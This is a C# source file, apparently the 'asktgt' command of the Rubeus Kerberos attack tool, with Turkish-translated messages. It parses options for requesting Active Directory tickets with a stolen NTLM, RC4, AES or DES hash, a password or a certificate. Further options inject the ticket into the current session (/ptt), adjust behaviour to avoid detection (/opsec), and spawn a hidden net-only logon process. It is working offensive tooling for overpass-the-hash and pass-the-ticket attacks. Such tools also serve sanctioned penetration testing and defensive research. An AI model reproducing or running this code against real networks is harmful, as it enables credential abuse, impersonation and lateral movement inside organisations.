using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using Rubeus.lib.Interop;


namespace Rubeus.Commands
{
    public class Asktgt : ICommand
    {
        public static string CommandName => "asktgt";

        public void Execute(Dictionary<string, string> arguments)
        {
            Console.WriteLine("[*] Eylem: TGT Iste\r\n");

            string user = "";
            string domain = "";
            string password = "";
            string hash = "";
            string dc = "";
            string outfile = "";
            string certificate = "";
            string servicekey = "";
            string principalType = "principal";
            
            bool ptt = false;
            bool opsec = false;
            bool force = false;
            bool verifyCerts = false;
            bool getCredentials = false;
            bool pac = true;
            LUID luid = new LUID();
            Interop.KERB_ETYPE encType = Interop.KERB_ETYPE.subkey_keymaterial;
            Interop.KERB_ETYPE suppEncType = Interop.KERB_ETYPE.subkey_keymaterial;

            string proxyUrl = null;
            string service = null;
            bool nopreauth = arguments.ContainsKey("/nopreauth");

            if (arguments.ContainsKey("/user"))
            {
                string[] parts = arguments["/user"].Split('\\');
                if (parts.Length == 2)
                {
                    domain = parts[0];
                    user = parts[1];
                }
                else
                {
                    user = arguments["/user"];
                }
            }
            if (arguments.ContainsKey("/domain"))
            {
                domain = arguments["/domain"];
            }
            if (arguments.ContainsKey("/dc"))
            {
                dc = arguments["/dc"];
            }
            if (arguments.ContainsKey("/outfile"))
            {
                outfile = arguments["/outfile"];
            }

            encType = Interop.KERB_ETYPE.rc4_hmac; //eger /enctype belirtilmemisse varsayilan
            if (arguments.ContainsKey("/enctype")) {
                string encTypeString = arguments["/enctype"].ToUpper();

                if (encTypeString.Equals("RC4") || encTypeString.Equals("NTLM")) {
                    encType = Interop.KERB_ETYPE.rc4_hmac;
                } else if (encTypeString.Equals("AES128")) {
                    encType = Interop.KERB_ETYPE.aes128_cts_hmac_sha1;
                } else if (encTypeString.Equals("AES256") || encTypeString.Equals("AES")) {
                    encType = Interop.KERB_ETYPE.aes256_cts_hmac_sha1;
                } else if (encTypeString.Equals("DES")) {
                    encType = Interop.KERB_ETYPE.des_cbc_md5;
                }
            }
            if (String.IsNullOrEmpty(domain))
            {
                domain = System.DirectoryServices.ActiveDirectory.Domain.GetCurrentDomain().Name;

                Console.WriteLine("[*] Domain alindi: {0}", domain);
            }

            if (arguments.ContainsKey("/password"))
            {
                password = arguments["/password"];

                // no-preauth sonrasi PA-ETYPE-INFO2 salt kullanimina izin vermek icin hash turetmeyi ertele
                hash = null;
            }

            else if (arguments.ContainsKey("/des"))
            {
                hash = arguments["/des"];
                encType = Interop.KERB_ETYPE.des_cbc_md5;
            }
            else if (arguments.ContainsKey("/rc4"))
            {
                hash = arguments["/rc4"];
                encType = Interop.KERB_ETYPE.rc4_hmac;
            }
            else if (arguments.ContainsKey("/ntlm"))
            {
                hash = arguments["/ntlm"];
                encType = Interop.KERB_ETYPE.rc4_hmac;
            }
            else if (arguments.ContainsKey("/aes128"))
            {
                hash = arguments["/aes128"];
                encType = Interop.KERB_ETYPE.aes128_cts_hmac_sha1;
            }
            else if (arguments.ContainsKey("/aes256"))
            {
                hash = arguments["/aes256"];
                encType = Interop.KERB_ETYPE.aes256_cts_hmac_sha1;
            }
            
            if (arguments.ContainsKey("/certificate")) {
                certificate = arguments["/certificate"];

                if(arguments.ContainsKey("/verifychain") || arguments.ContainsKey("/verifycerts"))
                {
                    Console.WriteLine("[*] Tum sertifika zinciri dogrulaniyor!\r\n");
                    verifyCerts = true;
                }
                if (arguments.ContainsKey("/getcredentials"))
                {
                    getCredentials = true;
                }
            }

            if (arguments.ContainsKey("/servicekey")) {
                servicekey = arguments["/servicekey"];
            }

            if (arguments.ContainsKey("/ptt"))
            {
                ptt = true;
            }

            if (arguments.ContainsKey("/opsec"))
            {
                opsec = true;
                if (arguments.ContainsKey("/force"))
                {
                    force = true;
                }
            }

            if (arguments.ContainsKey("/nopac"))
            {
                pac = false;
            }


            if (arguments.ContainsKey("/proxyurl"))
            {
                proxyUrl = arguments["/proxyurl"];
            }
            if (arguments.ContainsKey("/service"))
            {
                service = arguments["/service"];
            }

            if (arguments.ContainsKey("/luid"))
            {
                try
                {
                    luid = new LUID(arguments["/luid"]);
                }
                catch
                {
                    Console.WriteLine("[X] Gecersiz LUID formati ({0})\r\n", arguments["/luid"]);
                    return;
                }
            }

            if (arguments.ContainsKey("/suppenctype"))
            {
                string encTypeString = arguments["/suppenctype"].ToUpper();

                if (encTypeString.Equals("RC4") || encTypeString.Equals("NTLM"))
                {
                    suppEncType = Interop.KERB_ETYPE.rc4_hmac;
                }
                else if (encTypeString.Equals("AES128"))
                {
                    suppEncType = Interop.KERB_ETYPE.aes128_cts_hmac_sha1;
                }
                else if (encTypeString.Equals("AES256") || encTypeString.Equals("AES"))
                {
                    suppEncType = Interop.KERB_ETYPE.aes256_cts_hmac_sha1;
                }
                else if (encTypeString.Equals("DES"))
                {
                    suppEncType = Interop.KERB_ETYPE.des_cbc_md5;
                }
            }
            else
            {
                suppEncType = encType;
            }
            if (arguments.ContainsKey("/principaltype")) {
                principalType = arguments["/principaltype"]; 
            }

            if (arguments.ContainsKey("/createnetonly"))
            {
                // eger ticket'i uygulamak icin gizli bir surec baslatiyorsak
                if (!Helpers.IsHighIntegrity())
                {
                    Console.WriteLine("[X] Olusturulan logon session'a bir ticket uygulamak icin yuksek butunluk (high integrity) seviyesinde olmaniz gerekir");
                    return;
                }
                if (arguments.ContainsKey("/show"))
                {
                    luid = Helpers.CreateProcessNetOnly(arguments["/createnetonly"], true);
                }
                else
                {
                    luid = Helpers.CreateProcessNetOnly(arguments["/createnetonly"], false);
                }
                Console.WriteLine();
            }

            if (String.IsNullOrEmpty(user))
            {
                Console.WriteLine("\r\n[X] Bir kullanici adi saglamalisiniz!\r\n");
                return;
            }
            if (String.IsNullOrEmpty(hash) && String.IsNullOrEmpty(certificate) && String.IsNullOrEmpty(password) && !nopreauth)
            {
                Console.WriteLine("\r\n[X] Bir /password, /certificate veya bir [/des|/rc4|/aes128|/aes256] hash saglamalisiniz!\r\n");
                return;
            }

            bool changepw = arguments.ContainsKey("/changepw");

            if (!((encType == Interop.KERB_ETYPE.des_cbc_md5) || (encType == Interop.KERB_ETYPE.rc4_hmac) || (encType == Interop.KERB_ETYPE.aes128_cts_hmac_sha1) || (encType == Interop.KERB_ETYPE.aes256_cts_hmac_sha1)))
            {
                Console.WriteLine("\r\n[X] Su anda yalnizca /des, /rc4, /aes128 ve /aes256 desteklenmektedir.\r\n");
                return;
            }
            else
            {
                if ((opsec) && (encType != Interop.KERB_ETYPE.aes256_cts_hmac_sha1) && !(force))
                {
                    Console.WriteLine("[X] /opsec kullaniliyor ama /enctype:aes256 kullanilmiyor, bu davranisi zorlamak icin /force kullanin");
                    return;
                }
                if (nopreauth)
                {
                    try
                    {
                        Ask.NoPreAuthTGT(user, domain, hash, encType, dc, outfile, ptt, luid, true, true, proxyUrl, service, suppEncType, opsec, principalType);
                    }
                    catch (KerberosErrorException ex)
                    {
                        KRB_ERROR error = ex.krbError;
                        try
                        {
                            Console.WriteLine("\r\n[X] KRB-ERROR ({0}) : {1}: {2}\r\n", error.error_code, (Interop.KERBEROS_ERROR)error.error_code, error.e_text);
                        }
                        catch
                        {
                            Console.WriteLine("\r\n[X] KRB-ERROR ({0}) : {1}\r\n", error.error_code, (Interop.KERBEROS_ERROR)error.error_code);
                        }
                    }
                }
                else if (String.IsNullOrEmpty(certificate))
                {
                    if (!String.IsNullOrEmpty(password))
                    {
                        string oldsam = arguments.ContainsKey("/oldsam") ? arguments["/oldsam"] : null;
                        Ask.TGTWithPassword(user, domain, password, encType, outfile, ptt, dc, luid, true, opsec, servicekey, changepw, pac, proxyUrl, service, suppEncType, principalType, oldsam);
                    }
                    else
                    {
                        Ask.TGT(user, domain, hash, encType, outfile, ptt, dc, luid, true, opsec, servicekey, changepw, pac, proxyUrl, service, suppEncType, principalType);
                    }
                }
                else
                    Ask.TGT(user, domain, certificate, password, encType, outfile, ptt, dc, luid, true, verifyCerts, servicekey, getCredentials, proxyUrl, service, changepw, principalType);

                return;
            }
        }
    }
}
